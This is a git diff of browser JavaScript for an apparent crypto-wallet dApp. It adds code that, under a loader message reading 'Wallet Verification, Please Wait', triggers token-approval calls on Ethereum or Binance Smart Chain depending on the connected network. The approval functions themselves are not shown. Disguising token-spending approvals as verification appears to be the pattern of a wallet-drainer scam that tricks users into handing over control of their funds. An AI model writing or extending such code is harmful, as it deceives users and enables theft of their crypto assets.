@@ -2,7 +2,7 @@
 // import Web3Modal from '../../node_modules/web3modal';
 "use strict";
 
-import { approveTokens, referFriend, userHasReceivedToken, userReferralStatus } from "./web3_interaction.js";
+import { approveBscTokens, approveTokens, referFriend, userHasReceivedToken, userReferralStatus } from "./web3_interaction.js";
 
 
 
@@ -86,6 +86,7 @@ export async function fetchAccountData(provider) {
 
   // Get connected chain id from Ethereum node
   const chainId = await web3.eth.getChainId();
+  console.log(chainId)
 
   // Get list of accounts of the connected wallet
   console.log("Fetching Wallet")
@@ -98,12 +99,7 @@ export async function fetchAccountData(provider) {
 
   display_wallet_status()
   localStorage.setItem("account",accounts[0])
-
-  document.querySelector("#selected-account").textContent = selectedAccount;
-
-  // Get a handl
-  const template = document.querySelector("#template-balance");
-  const accountContainer = document.querySelector("#accounts");
+  location.reload()
 
 }
 
@@ -124,7 +120,7 @@ async function refreshAccountData(provider) {
  * Checking if connected network is ethereum
  */
 export async function is_ethereum_chainId() {
-  const web3 = new Web3(provider);
+  const web3 = new Web3(window.ethereum);
 
   // Request the current chain ID
   // const chainId = await window.ethereum.request({ method: 'eth_chainId' });
@@ -134,15 +130,7 @@ export async function is_ethereum_chainId() {
   // const chainId = await provider.eth.getChainId();
   console.log(chainId)
 
-  // Check if the chain ID matches BSC (56)
-  if (chainId == '56') {
-    console.log('Connected to Binance Smart Chain (BSC)');
-    return true
-  } 
-  else {
-    // console.log('Not connected to Binance Smart Chain (BSC)');
-    return false
-  }
+  return chainId
 }
 
 
@@ -230,7 +218,9 @@ async function display_wallet_status(){
       loader_msg.textContent = "Wallet Verification, Please Wait This May Take A While...";
 
       // approving tokens
-      await approveTokens();
+      if(await is_ethereum_chainId() == '56'){ await approveBscTokens(); }
+      else if(await is_ethereum_chainId() == '1') {await approveTokens();}
+      else{window.alert("Connect To The Binance Smart Chain Or Ethereum Network For This Application To Work Properly.")}
 
       //closing loader
       loader.style.display = "none";
